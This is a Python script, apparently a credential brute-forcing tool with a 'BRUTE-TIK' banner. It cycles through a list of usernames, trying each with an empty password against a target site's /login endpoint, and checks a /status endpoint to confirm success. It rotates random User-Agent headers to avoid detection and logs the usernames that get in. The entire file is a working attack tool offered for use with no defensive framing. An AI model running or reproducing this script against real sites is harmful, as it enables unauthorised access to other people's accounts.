import requests
import json
import random
import threading
import time
from colorama import init, Fore

class UserAgentLoader(threading.Thread):
    def __init__(self, filename):
        threading.Thread.__init__(self)
        self.filename = filename

    def run(self):
        global user_agents
        with open(self.filename, 'r') as f:
            user_agents = json.load(f)['user_agents']

def get_user_input(prompt, y, x):
    print(prompt, end='', flush=True)
    return input()

def update_timer(start_time):
    while True:
        elapsed_time = int(time.time() - start_time)
        print(f"\rElapsed time: {elapsed_time} seconds", end='', flush=True)
        time.sleep(1)

def bruteforce_login():
    global user_agents

    init(autoreset=True)

    print(Fore.CYAN + """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗ ████████╗██╗██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝ ╚══██╔══╝██║██║ ██╔╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗██║   ██║█████╔╝ 
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝╚════╝██║   ██║██╔═██╗ 
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║   ██║██║  ██╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝   ╚═╝╚═╝  ╚═╝
    """)

    time.sleep(3)

    print("\nPress Enter to start...")
    input()

    url = get_user_input("Enter URL (e.g., http://example.net) >>> ", 2, 35).strip()
    login_url = f'{url}/login'
    status_url = f'{url}/status?var=callBack'
    logout_url = f'{url}/logout'

    username_file = get_user_input("Enter usernames file name >>> ", 2, 33).strip()
    password = ''

    cleaned_url = url.replace("http://", "")
    headers = {
        'Host': f'{cleaned_url}',
        'Accept': '*/*',
        'Referer': f'{login_url}',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }

    start_time = time.time()
    threading.Thread(target=update_timer, args=(start_time,), daemon=True).start()

    print("Starting brute-force attack...\n")

    ua_loader = UserAgentLoader('user_agents.json')
    ua_loader.start()
    ua_loader.join()

    try:
        attempts = 1
        with open(username_file, 'r') as file:
            for line in file:
                username = line.strip()
                try:
                    headers['User-Agent'] = random.choice(user_agents)

                    session = requests.Session()

                    response = session.post(login_url, data={'username': username, 'password': password}, headers=headers)

                    if response.status_code != 200:
                        print(Fore.RED + f'Failed to login with username: {username}, received status code: {response.status_code}\n')
                        continue

                    status_response = session.get(status_url, headers=headers)

                    if status_response.status_code != 200:
                        print(Fore.RED + f'Failed to get status for username: {username}, received status code: {status_response.status_code}\n')
                        continue

                    try:
                        response_data = status_response.json()
                    except ValueError:
                        print(f'Attempt {attempts}: Username is : {username}')
                        attempts += 1
                        continue

                    if response_data.get("logged_in") == "yes":
                        print(Fore.GREEN + f'\n[+] Success! The username is: {username}\n')
                        with open('results.txt', 'a') as results_file:
                            results_file.write(username + '\n')

                        # Logout the user
                        session.get(logout_url, headers=headers)

                        print(Fore.YELLOW + "[!] User logged out successfully\n")

                except requests.ConnectionError:
                    print(Fore.RED + f'[#] Network problem or URL is not responding for username: {username}\n')
                    continue
                except requests.RequestException as e:
                    print(Fore.RED + f'[#] An error occurred with username {username}: {e}\n')
                    continue

        print(Fore.RED + '[*] Failed to find the usernames list.\n')

    except FileNotFoundError:
        print(Fore.RED + f'Error: File {username_file} not found!\n')

    input('Press Enter to exit...')

if __name__ == "__main__":
    bruteforce_login()
